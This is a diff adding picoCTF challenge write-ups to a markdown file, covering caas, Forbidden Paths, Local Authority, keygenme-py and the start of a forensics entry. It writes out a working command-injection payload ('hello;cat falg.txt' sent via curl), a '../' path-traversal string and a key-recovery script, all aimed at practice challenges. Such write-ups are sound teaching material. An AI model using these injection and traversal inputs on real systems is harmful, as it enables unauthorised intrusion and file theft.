@@ -20,6 +20,52 @@ This one was very easy. I just had to put Picobroswer in my useragent. I have us
 
 `picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}`
 
+## caas
+
+Line 8 in the given code looks exploitable
+
+`  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {`
+
+it is executing whatever you put at the end of the message, so you can do send a message like `hello;ls` and you will get the output of 'ls'.
+
+```
+< hello >
+ -------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+Dockerfile
+falg.txt
+index.js
+node_modules
+package.json
+public
+yarn.lock
+```
+
+So `falg.txt` is right here. I wasted 25 mins here trying to cat out `flag.txt` instead of `falg.txt`. But finally I saw it. This is the final query I used. Using `%20` instead of space.
+
+`curl "https://caas.mars.picoctf.net/cowsay/hello;cat%20falg.txt"`
+
+## Forbidden Paths
+
+This one was very easy. Paths that start with `/` are blocked, but you can just do `../` a bunch of times, and you will eventually reach the root directly, so i resuested the file `../../../../../../flag.txt` and got the flag.
+
+## Local Authority
+
+In the `login.php` found in the the html, we see these interesting lines
+
+```php
+          document.getElementById('msg').innerHTML = "Log In Successful";
+          document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
+          document.getElementById('hiddenAdminForm').submit();
+```
+
+So it is submitting a hiddn form using this. Lets see what happens when we run this in the console after an uncessful login.
+
+We are redirected to admin.php, and the flag is found!!
 
 # Reverse
 
@@ -35,5 +81,31 @@ Which when unicode decoded gives
 
 `picoCTF{b4d_brogrammer_3da34a8f}`
 
-## 
+## keygenme-py
+
+This is the code I used, it is finding these indices [4,5,3,6,2,7,1,8] of `(hashlib.sha256(username_trial).hexdigest()` . Its the reverse of what they use to find the key.
+
+```python
+import hashlib
+
+username_trial = b"FRASER"
+key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
+key_part_static2_trial = "}"
+
+key =[]
+index = [4,5,3,6,2,7,1,8]
+for i in index:
+    key.append(hashlib.sha256(username_trial).hexdigest()[i])
+
+key_part_dynamic1_trial = "".join(key)
+
+key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
+print(key_full_template_trial)
+```
+
+# Forensics
+
+## tunn3l v1s10n
+
+The file doesnt have a extention, so i tried `xxd tunn3l_v1s10n | less` to see the first 2 chars of the hexdump which are `BM` which means it is a bitmap (.bmp) file.
 
